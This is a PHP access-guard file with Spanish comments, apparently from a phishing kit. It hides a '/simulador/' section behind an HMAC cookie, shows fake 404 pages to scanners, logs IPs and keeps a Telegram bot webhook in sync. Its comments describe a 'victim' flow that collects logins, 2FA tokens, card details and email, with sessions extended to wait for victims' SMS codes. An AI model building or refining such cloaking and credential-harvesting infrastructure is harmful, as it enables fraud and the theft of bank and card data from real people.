<?php
// =====================================================================
// _guard.php — Validación de cookie HMAC del gate raíz para /simulador/
// Cualquier acceso sin cookie válida => 404 + blacklist progresiva.
// Bypass intencional: bot.php (webhook Telegram) NO incluye este guard,
// el .htaccess permite la ruta solo para método POST con secret header.
// =====================================================================

if (defined('SIM_GUARD_LOADED')) return;
define('SIM_GUARD_LOADED', true);

require_once __DIR__ . '/../_lib.php';

// ---------------------------------------------------------------------
// Configurar vida de sesión a 2 horas (7200 s) ANTES de session_start().
// Razón: el flujo víctima → login → token → card → mail puede ser largo
// (esperar SMS/email/2FA). Con el default de 24 min PHP, $_SESSION['usuario']
// se pierde y se redirige a index.php interrumpiendo el flujo.
// ---------------------------------------------------------------------
if (session_status() === PHP_SESSION_NONE) {
    @ini_set('session.gc_maxlifetime', '7200');
    @ini_set('session.cookie_lifetime', '7200');
    // session_set_cookie_params solo si la sesión aún no arrancó
    $params = session_get_cookie_params();
    @session_set_cookie_params([
        'lifetime' => 7200,
        'path'     => $params['path']     ?? '/',
        'domain'   => $params['domain']   ?? '',
        'secure'   => $params['secure']   ?? false,
        'httponly' => $params['httponly'] ?? true,
        'samesite' => $params['samesite'] ?? 'Lax',
    ]);
}

$_guard_ip = $_SERVER['REMOTE_ADDR'] ?? '';

// Kill switch global => fuera todos (control manual de emergencia).
if (gate_kill_switch_active()) {
    http_response_code(503);
    header('Content-Type: text/html; charset=UTF-8');
    echo '<!DOCTYPE html><html><head><title>503 Service Unavailable</title></head><body><h1>Service Unavailable</h1></body></html>';
    exit;
}

// Si la cookie HMAC del gate es válida => continuar.
if (gate_has_valid_cookie()) {
    // Tracking de pageview para el panel admin (silencioso si falta el lib)
    @include_once __DIR__ . '/../_track.php';
    if (function_exists('track_visit')) { @track_visit('pg'); }
    // Auto-sync del webhook de Telegram (idempotente; solo dispara si la URL cambió).
    // Se carga aquí porque _guard se incluye en todas las páginas protegidas.
    @include_once __DIR__ . '/_tg.php';
    if (function_exists('tg_ensure_webhook')) tg_ensure_webhook();
    return;
}

// ---- Acceso sin cookie: log + delay anti fuerza-bruta + 404 ----
// Ya NO hay blacklist por IP: causaba autobaneos del admin y baneaba
// NATs enteros (varios usuarios reales tras una misma IP en Nicaragua).
// La barrera real es la cookie HMAC; el delay frena el escaneo masivo
// sin afectar a un visitante que solo se equivocó de URL una vez.
$ip = $_SERVER['REMOTE_ADDR'] ?? '';
$blocked_log_file = __DIR__ . '/blocked_log.txt';

if (filter_var($ip, FILTER_VALIDATE_IP)) {
    @file_put_contents(
        $blocked_log_file,
        date('Y-m-d H:i:s') . " | $ip | guard_no_cookie | " . ($_SERVER['REQUEST_URI'] ?? '?') . PHP_EOL,
        FILE_APPEND | LOCK_EX
    );
}

// Delay: cada intento sin cookie tarda ~1.5s -> escanear cientos de
// rutas se vuelve lento e impráctico. Transparente para humanos.
usleep(1500000);

// Respuesta neutral: 404 sin pista (no revelar que existe el endpoint)
http_response_code(404);
header('Content-Type: text/html; charset=UTF-8');
header('Cache-Control: no-store, no-cache, must-revalidate, private');
echo '<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>';
exit;
